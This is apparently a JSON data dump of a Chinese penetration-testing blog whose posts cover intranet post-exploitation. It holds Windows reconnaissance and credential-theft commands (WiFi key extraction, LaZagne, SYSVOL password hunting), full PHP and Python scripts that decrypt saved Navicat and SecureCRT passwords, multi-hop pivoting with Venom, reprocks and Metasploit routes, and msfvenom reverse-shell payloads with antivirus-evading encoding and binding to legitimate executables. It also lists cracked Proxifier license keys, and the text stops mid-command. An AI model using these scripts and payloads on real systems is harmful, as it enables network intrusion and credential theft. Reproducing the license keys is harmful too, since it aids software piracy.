{"meta":{"title":"VK's blog","subtitle":"VK's blog","description":null,"author":"VK","url":"http://www.vkxss.top","root":"/"},"pages":[{"title":"404 Not Found：该页无法显示","date":"2019-09-25T08:45:31.231Z","updated":"2019-09-25T08:45:31.231Z","comments":false,"path":"/404.html","permalink":"http://www.vkxss.top//404.html","excerpt":"","text":""},{"title":"关于","date":"2019-10-10T09:29:30.628Z","updated":"2019-10-10T09:29:30.628Z","comments":false,"path":"about/index.html","permalink":"http://www.vkxss.top/about/index.html","excerpt":"","text":"生如蝼蚁，当立鸿鹄之志。命如薄纸，却有不屈之心。乾坤未定，你我皆是黑马。祝你我飞黄腾达前程似锦。"},{"title":"书单","date":"2019-09-08T07:27:54.732Z","updated":"2019-09-08T07:27:54.732Z","comments":false,"path":"books/index.html","permalink":"http://www.vkxss.top/books/index.html","excerpt":"","text":""},{"title":"友情链接","date":"2019-12-03T08:39:25.871Z","updated":"2019-12-03T08:39:25.871Z","comments":true,"path":"links/index.html","permalink":"http://www.vkxss.top/links/index.html","excerpt":"","text":"www.syst1m.com"},{"title":"分类","date":"2019-09-08T06:03:31.259Z","updated":"2019-09-06T14:06:42.000Z","comments":false,"path":"categories/index.html","permalink":"http://www.vkxss.top/categories/index.html","excerpt":"","text":""},{"title":"标签","date":"2019-09-08T06:03:31.300Z","updated":"2019-09-06T14:06:42.000Z","comments":false,"path":"tags/index.html","permalink":"http://www.vkxss.top/tags/index.html","excerpt":"","text":""},{"title":"Repositories","date":"2019-09-08T06:06:03.124Z","updated":"2019-09-06T14:06:42.000Z","comments":false,"path":"repository/index.html","permalink":"http://www.vkxss.top/repository/index.html","excerpt":"","text":""}],"posts":[{"title":"小程序-获取小程序源码（Alipay）","slug":"小程序-获取小程序源码(支付宝)","date":"2020-05-18T08:58:37.000Z","updated":"2020-05-19T10:01:08.784Z","comments":true,"path":"2020/05/18/小程序-获取小程序源码(支付宝)/","link":"","permalink":"http://www.vkxss.top/2020/05/18/小程序-获取小程序源码(支付宝)/","excerpt":"","text":"","categories":[{"name":"WEB安全","slug":"WEB安全","permalink":"http://www.vkxss.top/categories/WEB安全/"}],"tags":[{"name":"小程序","slug":"小程序","permalink":"http://www.vkxss.top/tags/小程序/"}]},{"title":"小程序-获取小程序源码（Wechat）","slug":"小程序-获取小程序源码(微信)","date":"2020-05-18T08:58:37.000Z","updated":"2020-05-19T10:01:10.343Z","comments":true,"path":"2020/05/18/小程序-获取小程序源码(微信)/","link":"","permalink":"http://www.vkxss.top/2020/05/18/小程序-获取小程序源码(微信)/","excerpt":"","text":"","categories":[{"name":"WEB安全","slug":"WEB安全","permalink":"http://www.vkxss.top/categories/WEB安全/"}],"tags":[{"name":"小程序","slug":"小程序","permalink":"http://www.vkxss.top/tags/小程序/"}]},{"title":"内网渗透-信息搜集-windows篇","slug":"内网渗透-信息搜集-windows篇","date":"2020-05-02T17:14:22.000Z","updated":"2020-05-07T08:57:35.478Z","comments":true,"path":"2020/05/03/内网渗透-信息搜集-windows篇/","link":"","permalink":"http://www.vkxss.top/2020/05/03/内网渗透-信息搜集-windows篇/","excerpt":"","text":"当前主机信息搜集 常用信息搜集 密码搜集 连通性 域信息搜集 常用信息搜集 环境信息搜集 密码搜集 内网探测脚本 当前主机信息搜集常用信息搜集 whoami # 查看当前用户 net user # 查看所有用户 query # 查看当前在线用户 ipconfig /all # 查看当前主机的主机名/IP/DNS等信息 route print # 查看路由表信息 netstat -ano # 查看端口开放情况 arp -a # 查看arp解析情况 tasklist /svc # 查看进程及对应服务名 net localgroup administrators # 查看管理员组成员 systeminfo # 查看系统信息含补丁信息 net use # 查看ipc连接情况 net view # 查看匿名共享情况 netsh firewall show state # 查看防火墙状态 cmdkey /l # 查看当前保存的登陆凭证 密码搜集 netsh wlan show profiles # 查看连接过的wifi名称 netsh wlan show profile name=”wifi名称” key=clear # 查看wifi的密码 dir /a %userprofile%\\AppData\\Local\\Microsoft\\Credentials* # 查看RDP连接凭证 dir /a /s /b “网站目录\\*config*“ &gt; 1.txt # 数据库配置文件 laZagne.exe all -oN # 本地wifi/浏览器等密码 dir %APPDATA%\\Microsoft\\Windows\\Recent # 查看最近打开的文档 连通性 ping www.baidu.com # ICMP连通性 nslookup www.baidu.com # DNS连通性 curl https://www.baidu.com # http连通性 nc ip port # TCP连通性 域信息搜集常用信息搜集 whoami /all # 获取域id net config workstation #查看当前登录域 net user /domain # 获得所有域用户列表 net view /domain # 查看所有的域 net view /domain:XXX # 查看域内某台主机详情 net group /domain # 查看所有域用户组列表 net group “domain computers” /domain # 查看域内所有的主机名 net group “domain admins” /domain # 查看所有域管理员 net group “domain controllers” /domain # 查看所有域控制器 net group “enterprise admins” /domain # 查看所有企业管理员 nltest /domain_trusts # 获取域信任信息 net time /domain # 查看当前登录域 net accounts /domain # 查看域密码策略 dsquery server # 寻找目录中的域控制器 环境信息搜集 nbtscan.exe xx.xx.xx.xx/24 # 查看c段机器 csvde.exe -f 1.csv -k # 批量导入/导出AD用户 setspn.exe -T xx.xx.xx.xx -Q / # 查看当前域内所有spn 密码搜集 dir /s /a \\域控IP\\SYSVOL*.xml # 获取域里面所有机子的本地管理员账号密码 内网探测脚本 //一键获取wifi密码 for /f “skip=9 tokens=1,2 delims=:” %i in (‘netsh wlan show profiles’) do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear //查看是否支持posershell if defined PSModulePath (echo 支持powershell) else (echo 不支持powershell) //批量扫描内网存活主机 for /l %i in (1,1,255) do @ping 10.0.0.%i -w 1 -n 1 | find /i “ttl” //域机器对应 IP FOR /F “eol=- tokens=1 delims=\\ “ %a IN (‘net view’) DO @(echo name: %a, ip: &amp; ping %a -w 1 -n 1 | find /i “ttl” &amp; echo.) //C段查找 for /l %i in (1,1,255) do @ping -a 10.0.1.%i -w 1 -n 1 | find /i “Ping” //B段查找 for /l %i in (1,1,255) do @ping -a 10.0.%i.1 -w 1 -n 1 | find /i “Ping”","categories":[{"name":"内网","slug":"内网","permalink":"http://www.vkxss.top/categories/内网/"}],"tags":[{"name":"内网渗透","slug":"内网渗透","permalink":"http://www.vkxss.top/tags/内网渗透/"}]},{"title":"内网渗透-内网密码信息搜集","slug":"内网渗透-内网密码搜集","date":"2020-05-01T17:14:22.000Z","updated":"2020-05-22T03:33:58.170Z","comments":true,"path":"2020/05/02/内网渗透-内网密码搜集/","link":"","permalink":"http://www.vkxss.top/2020/05/02/内网渗透-内网密码搜集/","excerpt":"","text":"0X01 内网密码搜集-Navicat连接密码解密 0X02 内网密码搜集-MobaXterm终端神器 0X03 Win SSH 及 SFTP 客户端密码 hash 解密 SecureCRT &lt; 7.1 0X04 内网信息搜集-浅谈windows管道 0X01 内网密码搜集-Navicat连接密码解密 NAvicat Permium 12为例 步骤一：选择文件—-&gt;导出连接，勾选想要导出的数据库，导出.ncx后缀的文件 步骤二：复制加密的password，运行如下php脚本。本地没有安装PHP，使用在线运行的工具https://tool.lu/coderunner/ 赋PHP脚本 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139&lt;?phpnamespace FatSmallTools;class NavicatPassword&#123; protected $version = 0; protected $aesKey = &apos;libcckeylibcckey&apos;; protected $aesIv = &apos;libcciv libcciv &apos;; protected $blowString = &apos;3DC5CA39&apos;; protected $blowKey = null; protected $blowIv = null; public function __construct($version = 12) &#123; $this-&gt;version = $version; $this-&gt;blowKey = sha1(&apos;3DC5CA39&apos;, true); $this-&gt;blowIv = hex2bin(&apos;d9c7c3c8870d64bd&apos;); &#125; public function encrypt($string) &#123; $result = FALSE; switch ($this-&gt;version) &#123; case 11: $result = $this-&gt;encryptEleven($string); break; case 12: $result = $this-&gt;encryptTwelve($string); break; default: break; &#125; return $result; &#125; protected function encryptEleven($string) &#123; $round = intval(floor(strlen($string) / 8)); $leftLength = strlen($string) % 8; $result = &apos;&apos;; $currentVector = $this-&gt;blowIv; for ($i = 0; $i &lt; $round; $i++) &#123; $temp = $this-&gt;encryptBlock($this-&gt;xorBytes(substr($string, 8 * $i, 8), $currentVector)); $currentVector = $this-&gt;xorBytes($currentVector, $temp); $result .= $temp; &#125; if ($leftLength) &#123; $currentVector = $this-&gt;encryptBlock($currentVector); $result .= $this-&gt;xorBytes(substr($string, 8 * $i, $leftLength), $currentVector); &#125; return strtoupper(bin2hex($result)); &#125; protected function encryptBlock($block) &#123; return openssl_encrypt($block, &apos;BF-ECB&apos;, $this-&gt;blowKey, OPENSSL_RAW_DATA|OPENSSL_NO_PADDING); &#125; protected function decryptBlock($block) &#123; return openssl_decrypt($block, &apos;BF-ECB&apos;, $this-&gt;blowKey, OPENSSL_RAW_DATA|OPENSSL_NO_PADDING); &#125; protected function xorBytes($str1, $str2) &#123; $result = &apos;&apos;; for ($i = 0; $i &lt; strlen($str1); $i++) &#123; $result .= chr(ord($str1[$i]) ^ ord($str2[$i])); &#125; return $result; &#125; protected function encryptTwelve($string) &#123; $result = openssl_encrypt($string, &apos;AES-128-CBC&apos;, $this-&gt;aesKey, OPENSSL_RAW_DATA, $this-&gt;aesIv); return strtoupper(bin2hex($result)); &#125; public function decrypt($string) &#123; $result = FALSE; switch ($this-&gt;version) &#123; case 11: $result = $this-&gt;decryptEleven($string); break; case 12: $result = $this-&gt;decryptTwelve($string); break; default: break; &#125; return $result; &#125; protected function decryptEleven($upperString) &#123; $string = hex2bin(strtolower($upperString)); $round = intval(floor(strlen($string) / 8)); $leftLength = strlen($string) % 8; $result = &apos;&apos;; $currentVector = $this-&gt;blowIv; for ($i = 0; $i &lt; $round; $i++) &#123; $encryptedBlock = substr($string, 8 * $i, 8); $temp = $this-&gt;xorBytes($this-&gt;decryptBlock($encryptedBlock), $currentVector); $currentVector = $this-&gt;xorBytes($currentVector, $encryptedBlock); $result .= $temp; &#125; if ($leftLength) &#123; $currentVector = $this-&gt;encryptBlock($currentVector); $result .= $this-&gt;xorBytes(substr($string, 8 * $i, $leftLength), $currentVector); &#125; return $result; &#125; protected function decryptTwelve($upperString) &#123; $string = hex2bin(strtolower($upperString)); return openssl_decrypt($string, &apos;AES-128-CBC&apos;, $this-&gt;aesKey, OPENSSL_RAW_DATA, $this-&gt;aesIv); &#125;&#125;use FatSmallTools\\NavicatPassword; //需要指定版本，11或12$navicatPassword = new NavicatPassword(12);//$navicatPassword = new NavicatPassword(11); //解密//$decode = $navicatPassword-&gt;decrypt(&apos;15057D7BA390&apos;);$decode = “密码：”.$navicatPassword-&gt;decrypt(&apos;83D95C24B42567332F09503BF701A252&apos;);echo $decode.&quot;\\n&quot;; 0X02 内网密码搜集-MobaXterm终端神器 看图操作 0X03 Win SSH 及 SFTP 客户端密码 hash 解密 SecureCRT &lt; 7.1###0x03.1 找到 SecureCRT 配置文件目录下的 Sessions 目录 直接把目标 SecureCRT config 目录下所对应的 session 文件想办法拖回来进行本地解密即可。 SecureCRT 的每个 session 文件都会用连接的 ip 或者域名的形式来命名。 解密脚本是基于 python2.7 的,解密也需要用到 pycrypto 库,这些基础环境都已提前准备好,还是那句话,此处的解密脚本只支持 7.x 系列解密,依赖库pycrypto py解密脚本： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879#!/usr/bin/env python## Decrypt SSHv2 passwords stored in VanDyke SecureCRT session files# Can be found on Windows in:# %APPDATA%\\VanDyke\\Config\\Sessions\\sessionname.ini# Tested with version 7.2.6 (build 606) for Windows# Eloi Vanderbeken - Synacktiv# Decrypt SSHv2 passwords stored in VanDyke SecureCRT# C:\\&gt;python SecureCRT-decryptpass.py -h# usage: SecureCRT-decryptpass.py [-h] files [files ...]##Tool to decrypt SSHv2 passwords in VanDyke Secure CRT session files##positional arguments:# files session file(s)##optional arguments:# -h, --help show this help message and exit## C:\\&gt;python SecureCRT-decryptpass.py C:\\Users\\user1\\AppData\\Roaming\\VanDyke\\Config\\Sessions\\192.168.0.1.ini# C:\\Users\\user1\\AppData\\Roaming\\VanDyke\\Config\\Sessions\\192.168.0.1.ini# ssh -p 22 user@192.168.0.1 # 123456from Crypto.Cipher import Blowfishimport argparseimport redef decrypt(password) : c1 = Blowfish.new(&apos;5F B0 45 A2 94 17 D9 16 C6 C6 A2 FF 06 41 82 B7&apos;.replace(&apos; &apos;,&apos;&apos;).decode(&apos;hex&apos;), Blowfish.MODE_CBC, &apos;\\x00&apos;*8) c2 = Blowfish.new(&apos;24 A6 3D DE 5B D3 B3 82 9C 7E 06 F4 08 16 AA 07&apos;.replace(&apos; &apos;,&apos;&apos;).decode(&apos;hex&apos;), Blowfish.MODE_CBC, &apos;\\x00&apos;*8) padded = c1.decrypt(c2.decrypt(password.decode(&apos;hex&apos;))[4:-4]) p = &apos;&apos; while padded[:2] != &apos;\\x00\\x00&apos; : p += padded[:2] padded = padded[2:] return p.decode(&apos;UTF-16&apos;)REGEX_HOSTNAME = re.compile(ur&apos;S:&quot;Hostname&quot;=([^\\r\\n]*)&apos;)REGEX_PASWORD = re.compile(ur&apos;S:&quot;Password&quot;=u([0-9a-f]+)&apos;)REGEX_PORT = re.compile(ur&apos;D:&quot;\\[SSH2\\] Port&quot;=([0-9a-f]&#123;8&#125;)&apos;)REGEX_USERNAME = re.compile(ur&apos;S:&quot;Username&quot;=([^\\r\\n]*)&apos;)def hostname(x) : m = REGEX_HOSTNAME.search(x) if m : return m.group(1) return &apos;???&apos;def password(x) : m = REGEX_PASWORD.search(x) if m : return decrypt(m.group(1)) return &apos;???&apos;def port(x) : m = REGEX_PORT.search(x) if m : return &apos;-p %d &apos;%(int(m.group(1), 16)) return &apos;&apos;def username(x) : m = REGEX_USERNAME.search(x) if m : return m.group(1) + &apos;@&apos; return &apos;&apos;parser = argparse.ArgumentParser(description=&apos;Tool to decrypt SSHv2 passwords in VanDyke Secure CRT session files&apos;)parser.add_argument(&apos;files&apos;, type=argparse.FileType(&apos;r&apos;), nargs=&apos;+&apos;, help=&apos;session file(s)&apos;)args = parser.parse_args()for f in args.files : c = f.read().replace(&apos;\\x00&apos;, &apos;&apos;) print f.name print &quot;ssh %s%s%s # %s&quot;%(port(c), username(c), hostname(c), password(c)) 除了 ssh 连接账号密码,如果本地还保存的有目标运维平时的命令历史记录,同样也值得关注,里面很可能还会存的有其它的各种账号密码,同样有用 0X04 内网信息搜集-浅谈windows管道 一句话获取电脑已经登录的QQ 1powershell : [System.Text.RegularExpressions.Regex]::Matches([System.IO.Directory]::GetFiles(&quot;\\\\.\\\\pipe\\\\&quot;),&quot;QQ_(\\d*)_pipe&quot;).Groups; 1cmd : dir \\\\.\\pipe\\\\ | findstr &quot;QQ_&quot; | findstr &quot;_pipe&quot;","categories":[{"name":"内网","slug":"内网","permalink":"http://www.vkxss.top/categories/内网/"}],"tags":[{"name":"内网渗透","slug":"内网渗透","permalink":"http://www.vkxss.top/tags/内网渗透/"}]},{"title":"内网渗透-内网穿透代理","slug":"内网渗透-内网穿透","date":"2020-05-01T04:13:13.000Z","updated":"2020-05-18T05:32:34.092Z","comments":true,"path":"2020/05/01/内网渗透-内网穿透/","link":"","permalink":"http://www.vkxss.top/2020/05/01/内网渗透-内网穿透/","excerpt":"","text":"0X01背景 因为我日常渗透使用的是MAC客户端，渗透工具包也在我的MAC下，在后渗透测试的时候，发现更多情况下proxychains4要比Proxifier好用。 有些时候在用一些Python脚本通过\b代理扫描的时候Proxifier会全部误报，甚至是无结果。并且发现Proxifier在我的MAC上没办法正确代理MSF的流量，所以我一般选择的都是proxychains4。 另外MAC上使用proxychains4是有坑的，要先去禁用SIP。 这里推荐proxychains4并不是说Proxifier不好用，只是有些情况不适用，但是Proxifier有他的强大之处，它可以自己指定规则，用起来很方便，尤其适用\bOSX下的一些客户端工具的流量代理，所以建议大家在实际使用的时候最好两者搭配起来使用。 但是从系统的安全角度，并不想禁用SIP。最终选择了kali。。。。。 0x02 本地工具proxychains4 Mac上安装proxychains4 brew install proxychains-ng vim /usr/local/etc/proxychains.conf Proxifier Mac上安装Proxifier，windos也一样。百度下载安装包即可。如下是我收集的破解Proxifier注册码序列号， 1234567Proxifier注册码序列号L6Z8A-XY2J4-BTZ3P-ZZ7DF-A2Q9C（Portable Edition）#免安装版本5EZ8G-C3WL5-B56YG-SCXM9-6QZAP（Standard Edition）#安装版本P427L-9Y552-5433E-8DSR3-58Z68（MAC） #mac版本 proxychains Kali自带proxychains vim /etc/proxychains.conf","categories":[{"name":"内网","slug":"内网","permalink":"http://www.vkxss.top/categories/内网/"}],"tags":[{"name":"内网渗透","slug":"内网渗透","permalink":"http://www.vkxss.top/tags/内网渗透/"}]},{"title":"内网渗透-边界穿透神器（Venom）","slug":"内网渗透-Venom内网工具使用实战","date":"2020-04-30T06:22:05.000Z","updated":"2020-05-18T05:36:19.424Z","comments":true,"path":"2020/04/30/内网渗透-Venom内网工具使用实战/","link":"","permalink":"http://www.vkxss.top/2020/04/30/内网渗透-Venom内网工具使用实战/","excerpt":"","text":"0x01 Venom使用 0x02 实战环境准备 0x03 构建多级代理 0x04 向节点上传/从节点下载文件 0x05 建立到某节点的socks5代理 0x06 将本地端口转发到远程/将远程端口转发到本地 0x07 流量加密传输 0x08 参考资料 0x01 Venom使用 步骤一：下载Venom（毒液） https://github.com/Dliv3/Venom/releases 如何使用官方介绍的很详细，简单介绍下。Venom；这是一款为渗透测试人员设计的使用Go开发的多级代理工具。Venom可将多个节点进行连接，然后以节点为跳板，构建多级代理。渗透测试人员可以使用Venom轻松地将网络流量代理到多层内网，并轻松地管理代理节点 步骤二：解压打开后的目录结构： 0x02 实战环境准备 外网vps + 靶标 场景一：vps_windows + 靶标_window admin节点和agent节点均可监听连接也可发起连接 123admin监听端口，agent发起连接:vps:admin.exe -lport 9999靶标:agent.exe -rhost 192.168.0.103 -rport 9999 123agent监听端口，admin发起连接:vps:agent.exe -lport 8888靶标:admin.exe -rhost 192.168.204.139 -rport 8888 场景二：vps_Linux + 靶标_靶标Linux 123admin监听端口，agent发起连接:vps:./admin_linux_x64 -lport 4343靶标:./agent_linux_x64 -rhost vps_ip -rport 4343 123agent监听端口，admin发起连接:vps:./agent_linux_x64 -lport 4343靶标:./admin_linux_x64 -rhost vps_ip -rport 4343 场景三：vps_Windows + 靶标_靶标Linux 123admin监听端口，agent发起连接:vps:admin.exe -lport 9999靶标:./agent_linux_x64 -rhost 118.89.224.245 -rport 9999 0x03 构建多级代理 Venom可将多个节点进行连接，然后以节点为跳板，构建多级代理。 场景一： 1、外网的vps，Ubuntu：120.10.120.X（反正就是一个外网的IP） 2、内网的机器三台windowsIP地址192.168.3.160、192.168.3.15、192.168.3.30 3、设想外网的VPS要访问最里面的3.160只能一层一层的依次访问；3.160只能和3.30相互访问；3.30可以和3.15，3.160访问而不能访问外网的VPS；最后3.15能被外网VPS访问，也能和3.30相互访问；这时我们就是用神器Venom来进行一层一层的代理；（大家都知道同一个局域网的都可以相互访问，但是这只是设想了一个场景便于理解使用） 步骤一： 1、将文件agent_linux_x64传到沦陷主机A,并对对应的执行文件进行修改权限 chmod 777 admin_linux_x64 步骤二： vps执行命令./admin_linux_x64 -lport 4343，监听本地4343端口 步骤三： 这里所有内网window机器都已经上传了Venom工具包并解压；接下来在192.168.3.15机器上面执行连接操作；执行命令agent.exe -rhost 120.10.120.X -rport 4343； 很快外网的VPS也监听成功了，获取了； 步骤四： 然后来在外网的VPS上进行操作；help，这里我们要使用到show，goto，listen，exit，shell这几个命令；先来看看怎么使用，余下的命令自己都可以摸索出来的； 这里执行show命令，可以看见刚刚进行连接的一个节点； 好勒，再来试试goto命令 这样可以切换到1节点上面去； 嘿，还是很简单的，接下里看看是否真的切换到192.168.3.15机器上面了，执行shell；就是192.168.3.15；这说明成功了； 步骤五 接下来exit退出，进行下一步的监听操作；在不退出1节点的基础上面执行listen 4343端口进行监听；192.168.3.15机器上面已经监听成功了； 步骤六 接着在192.168.3.30机器上面执行连接操作，执行命令：agent.exe -rhost 192.168.3.15 -rport 4343，执行成功了； 再回到VPS上面进行查看一下，执行show命令，是否新增了一个节点；新增了一个节点；Venom工具在执行过程中尽量不要将命令写错，这个没有办法删除错误的命令 ；只能enter了 切换到节点2中；执行命令：goto 2；切换成功了后ipconfig查看IP，192.168.3.30这就是了，没有问题了； 步骤七 现在进行最后一台机器；依次执行命令exit，listen 4343 ；192.168.3.30机器上面已经监听成功了 步骤八 最后在192.168.3.160机器上面进行连接操作，执行命令：agent.exe -rhost 192.168.3.30 -rport 4343 步骤九 最后回到VPS上面执行show查看一下成功没有； 依次执行命令：goto 3切换到3节点,shell,ipconfig,whoami；可以看到最后成功连接了3.160机器，这个过程就成功了 最后以上监听的端口在节点上面进行listen的时候可以不一致，一台机器上也可以监听多个端口，比如，内网2中有一台机器192.168.3.31，可以和3.30相互访问； 在节点2基础上面执行3.30本地监听；listen 11111 这里就是不是4343端口了，一样的可以监听成功。 在192.168.3.31上面执行命令:agent.exe -rhost 192.168.3.30 -rport 11111 再回到VPS上面执行show，可以看到新增一个节点4，这个就是192.168.3.31的机器了。 0x04 向节点上传/从节点下载文件 将node1的文件/tmp/test2.pdf下载到本地的/tmp/test3.pdf 将本地/tmp/test.pdf上传到node1的/tmp/test2.pdf 1234567891011(node 1) &gt;&gt;&gt; download /tmp/test2.pdf /tmp/test3.pdfdownload /tmp/test2.pdf from /tmp/test3.pdfthis file is too large(&gt;100M), still downloading? (y/n)y 154.23 MiB / 154.23 MiB [========================================] 100.00% 1sdownload file successfully!(node 1) &gt;&gt;&gt; upload /tmp/test.pdf /tmp/test2.pdfupload /tmp/test.pdf to /tmp/test2.pdfthis file is too large(&gt;100M), still uploading? (y/n)y 154.23 MiB / 154.23 MiB [========================================] 100.00% 1supload file successfully! 0x05 建立到某节点的socks5代理 执行成功socks命令之后，会在admin节点本地开启一个端口，如上述的7777，使用7777即可进行socks5代理 12(node 1) &gt;&gt;&gt; socks 7777a socks5 proxy of the target node has started up on local port 7777 0x06 将本地端口转发到远程/将远程端口转发到本地 lforward将admin节点本地的8888端口转发到node1的8888端口 12(node 1) &gt;&gt;&gt; lforward 127.0.0.1 8888 8888forward local network 127.0.0.1 port 8888 to remote port 8888 rforward 将node1网段的192.168.204.103端口8889转发到admin节点本地的8889端口 1234rforward 将node1网段的192.168.204.103端口8889转发到admin节点本地的8889端口(node 1) &gt;&gt;&gt; rforward 192.168.204.103 8889 8889forward remote network 192.168.204.103 port 8889 to local port 8889 0x07 流量加密传输 对抗安全设备的检测，更好的隐藏自己，所以我们对传输的流量进行加密 0x08 参考资料https://xz.aliyun.com/t/4058 https://www.pianshen.com/article/9287973165/","categories":[{"name":"内网","slug":"内网","permalink":"http://www.vkxss.top/categories/内网/"}],"tags":[{"name":"内网渗透","slug":"内网渗透","permalink":"http://www.vkxss.top/tags/内网渗透/"}]},{"title":"内网渗透-边界穿透神器-reprocks","slug":"内网渗透-边界穿透神器-reprocks","date":"2020-04-30T05:39:06.000Z","updated":"2020-05-18T06:24:28.070Z","comments":true,"path":"2020/04/30/内网渗透-边界穿透神器-reprocks/","link":"","permalink":"http://www.vkxss.top/2020/04/30/内网渗透-边界穿透神器-reprocks/","excerpt":"","text":"在渗透过程中，总是会碰到如下的问题： 我拿下了一台Windows/Linux,但是处于内网，又不能提权，我的目标是内网中的其他机器，此时怎么办？ 下载地址：https://github.com/RicterZ/reprocks 一共三种用法： 本机执行：server.py 8888 9999 肉鸡执行：client.py -m 1 本机IP 8888 #这样就把socks5代理服务转出来了 肉鸡执行：client.py -m 2 内网IP 内网端口 本机IP 8888 #这样就把内网别的端口服务转出来了 肉鸡执行：client.py -m 3 7070 这样就只是在肉鸡上监听7070端口开启socks5代理服务 技巧 可以后台运行： python client.py -m 1 8888 &gt;&gt; /dev/null 2&gt; &amp;1 &amp;","categories":[{"name":"内网","slug":"内网","permalink":"http://www.vkxss.top/categories/内网/"}],"tags":[{"name":"内网渗透","slug":"内网渗透","permalink":"http://www.vkxss.top/tags/内网渗透/"}]},{"title":"内网渗透-基于MSF的路由转发+内网探测实战","slug":"内网渗透-基于MSF的路由转发-内网探测实战","date":"2020-04-29T03:25:21.000Z","updated":"2020-05-01T17:36:41.469Z","comments":true,"path":"2020/04/29/内网渗透-基于MSF的路由转发-内网探测实战/","link":"","permalink":"http://www.vkxss.top/2020/04/29/内网渗透-基于MSF的路由转发-内网探测实战/","excerpt":"","text":"0x01 反弹MSF类型的Shell 0x02 添加内网路由 0x03 msf内网探测 0x04 socks 代理配置 0x05 总结 0x01 反弹MSF类型的Shell 步骤一：服务器:Linux 12生成msf shell msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST= LPORT=8080 -f elf &gt; payload.elf 步骤二：上传payload.elf到目标服务器，添加权限chomd 777 步骤三：msf开始监听 123456root@iZ2ze9muqv7y1i98lqo7ppZ:~# use exploit/multi/handlerset payload linux/x64/meterpreter/reverse_tcp set lhost 172.24.37.0set lport 8080exploit -j 小技巧： 12我们保存为.rc 方便我们快捷启动msf会话# msfconsole -r xxx.rc 0x02 添加内网路由 步骤一：获取内网网段： 12获取内网网段：# run get_local_subnets 步骤二：添加去往目标网段的转发路由： 123456789101112#在全局给指定的session加route add 192.168.11.0 255.255.255.0 1 #在session1中添加到达192.168.11.0网段的路由route add 192.168.12.0 255.255.255.0 1 #在session1中添加到达192.168.12.0网段的路由route add 0.0.0.0 0.0.0.0 1 #在session1中添加到达0.0.0.0/24网段的路由route del 192.168.12.0 255.255.255.0 2 #在session2中删除到达192.168.12.0网段的路由route print #打印路由信息 #也可以在进入session下添加路由run autoroute -s 192.168.11.0/24 #添加到达192.168.11.0网段的路由run autoroute -s 192.168.11.0/24 #添加到达192.168.12.0网段的路由run autoroute -p #打印路由信息 - 注意：在实际的内网渗透中，我们可以直接添加到 0.0.0.0/24的路由，这样，只要该被控主机可达的地址就都可达！ 步骤三:查看路由的添加情况： run autoroute -p 0x03 msf内网探测 我们扫描一下这个段的端口： 我们扫内网web服务： 0x04 socks 代理配置 msf代理设置： 返回后台：backgroud 就可以本地内网漫游了。 0x05 总结 Linux服务器下通过msf进行内网探测攻击 1、msf反弹shell，建立会话连接 2、通过msf获取目标服务器的网段 3、之后用background命令，将meterpretershell的session放到后台中运行 4、在后台中，然后调用nmap等各种模块进行横向的扫描或者攻击。 5、配置socks5代理，在本地内网漫游。","categories":[{"name":"内网","slug":"内网","permalink":"http://www.vkxss.top/categories/内网/"}],"tags":[{"name":"内网渗透","slug":"内网渗透","permalink":"http://www.vkxss.top/tags/内网渗透/"}]},{"title":"内网渗透-MSF反弹webshell","slug":"内网渗透-MSF反弹webshell","date":"2020-04-28T03:17:13.000Z","updated":"2020-05-01T17:36:55.055Z","comments":true,"path":"2020/04/28/内网渗透-MSF反弹webshell/","link":"","permalink":"http://www.vkxss.top/2020/04/28/内网渗透-MSF反弹webshell/","excerpt":"","text":"Msfvenom学习总结-MSF反弹webshell MSFVENOM实例 Msfvenom学习总结-MSF反弹webshell123456789101112131415161718192021222324252627282930313233343536373839404142431. –p (- -payload-options)- 添加载荷payload。载荷这个东西比较多，这个软件就是根据对应的载荷payload生成对应平台下的后门，所以只有选对payload，再填写正确自己的IP，PORT就可以生成对应语言，对应平台的后门了！！！(- -payload-options 列出payload选项)2. –l- 查看所有payload encoder nops。3. –f （- -help-formats）输出文件格式。(- -help-formats 列出所有文件格式)Executable formats:asp, aspx, aspx-exe, axis2, dll, elf, elf-so, exe, exe-only, exe-service, exe-small, hta-psh, jar, loop-vbs, macho, msi, msi-nouac, osx-app, psh, psh-net, psh-reflection, psh-cmd, vba, vba-exe, vba-psh, vbs, warTransform formats:bash, c, csharp, dw, dword, hex, java, js_be, js_le, num, perl, pl, powershell, ps1, py, python, raw, rb, ruby, sh, vbapplication, vbscript4. –e编码免杀。5. –a (- -platform – -help-platforms)选择架构平台x86 | x64 | x86_64Platforms:windows, netware, android, java, ruby, linux, cisco, solaris, osx, bsd, openbsd, bsdi, netbsd, freebsd, aix, hpux, irix, unix, php, javascript, python, nodejs, firefox, mainframe6. –o文件输出。7. –s生成payload的最大长度，就是文件大小。8. –b避免使用的字符 例如：不使用 ‘\\0f’。9. –i - 编码次数。10. –c添加自己的shellcode。11. –x | -k捆绑。例如：原先有个正常文件normal.exe 可以通过这个选项把后门捆绑到这个程序上面。 MSFVENOM实例12345678910111213141516171819202122232425262728293031323334353637383940414243441. 普通生成msfvenom -p &lt;payload&gt; &lt;payload options&gt; -f &lt;format&gt; -o &lt;path&gt;msfvenom –p windows/meterpreter/reverse_tcp –f exe –o C:\\back.exe2. 编码处理型msfvenom -p &lt;payload&gt; -e &lt;encoder &gt; -i &lt;encoder times&gt; -n &lt;nopsled&gt; -f &lt;format&gt; -o &lt;path&gt;msfvenom –p windows/meterpreter/reverse_tcp –i 3 –e x86/shikata_ga_nai –f exe –o C:\\back.exe3. 捆绑Msfvenom –p windows/meterpreter/reverse_tcp –platform windows –a x86 –x C:\\nomal.exe –k –f exe –o C:\\shell.exe4. WindowsMsfvenom –platform windows –a x86 –p windows/meterpreter/reverse_tcp –i 3 –e x86/shikata_ga_nai –f exe –o C:\\back.exeMsfvenom –platform windows –a x86 –p windows/x64/meterpreter/reverse_tcp –f exe –o C:\\back.exe5. Linuxmsfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf6. MACmsfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho7. PHPmsfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect 